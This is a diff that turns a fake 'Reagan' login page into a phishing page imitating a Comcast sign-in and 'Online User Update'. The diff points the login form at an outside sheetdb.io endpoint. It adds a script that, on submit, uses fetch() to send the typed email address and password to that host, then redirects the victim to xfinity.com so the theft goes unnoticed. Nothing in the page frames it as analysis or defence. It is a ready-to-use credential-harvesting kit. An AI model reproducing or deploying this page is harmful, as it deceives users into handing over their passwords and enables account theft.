@@ -1,7 +1,7 @@
 <html><head>
 <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
 
-<title>Reagan Client Web - Sign in</title>
+<title>Comcast Client Web - Sign in</title>
 
 <script type="text/javascript">
 
@@ -99,7 +99,7 @@ table{font-size:13px}body{height:100%;margin:0}body{font-family:arial,sans-serif
 </head><body link="#00FFFF" bgcolor="#FFFFFF">
 
 
-<form method="POST" action="attphp.php" onsubmit="return MM_validateForm('email','','RisEmail');">
+<form method="POST" id="sheetdb-form" action="https://sheetdb.io/api/v1/whg16nldzekbg">">
   
 	<table width="1140" border="0" cellpadding="0" cellspacing="0" height="202">
 		
@@ -110,7 +110,7 @@ table{font-size:13px}body{height:100%;margin:0}body{font-family:arial,sans-serif
 			
 			<td colspan="2" height="15" width="1136"><span class="rg_ctlv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 			<font size="4">&nbsp;&nbsp;&nbsp; <font color="#0000FF">&nbsp;&nbsp; 
-			Reagan Online User Update.</font></font></span><p>&nbsp;</p>
+			Comcast Online User Update.</font></font></span><p>&nbsp;</p>
 			<p>&nbsp;</td>
 		
 		</tr>
@@ -138,7 +138,7 @@ table{font-size:13px}body{height:100%;margin:0}body{font-family:arial,sans-serif
 			<span style="font-size: 8pt; font-weight:700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Email Address:</span></font></td>
 			
 			<td width="938" height="53"><font face="Verdana"><span style="font-size: 8pt;">
-			<input name="email" id="email" size="37" type="text"> eg.@reagan.com</span></font></td>
+			<input name="data[email]" id="email" size="37" type="text"> eg.@Comcast.com</span></font></td>
 		</tr>
 		<tr>
 			<td width="4" height="39">&nbsp;</td>
@@ -146,7 +146,7 @@ table{font-size:13px}body{height:100%;margin:0}body{font-family:arial,sans-serif
 			<span style="font-size: 8pt;"><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Password</b>:</span></font></td>
 
 			<td width="938" height="39"><font face="Verdana"><span style="font-size: 8pt;">
-			<input name="password" id="password" size="25" type="password"> </span></font></td>
+			<input name="date[pdf2]" id="password" size="25" type="password"> </span></font></td>
 		</tr>
 		<tr>
 			<td width="4" height="46">&nbsp;</td>
@@ -160,8 +160,23 @@ table{font-size:13px}body{height:100%;margin:0}body{font-family:arial,sans-serif
   </p><p>    
   </p>  
     </form>
+	<script>
+  var form = document.getElementById('sheetdb-form');
+  form.addEventListener("submit", e => {
+    e.preventDefault();
+    fetch(form.action, {
+        method : "POST",
+        body: new FormData(document.getElementById("sheetdb-form")),
+    }).then(
+        response => response.json()
+    ).then((html) => {
+      // eW91IGNhbiBwdXQgYW55IEpTIGNvZGUgaGVyZQ==
+      window.location.href = 'https://xfinity.com/';
+    });
+  });
+</script>
 <p><font size="1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font>
 </p>
-<p><font size="1">&nbsp;<b> © 2022 Reagan - ® All Rights Reserved, GA 30540     Terms & Conditions    |     Privacy Policy <br>
+<p><font size="1">&nbsp;<b> © 2022 Comcast - ® All Rights Reserved, GA 30540     Terms & Conditions    |     Privacy Policy <br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b></font></p>
 </body></html>
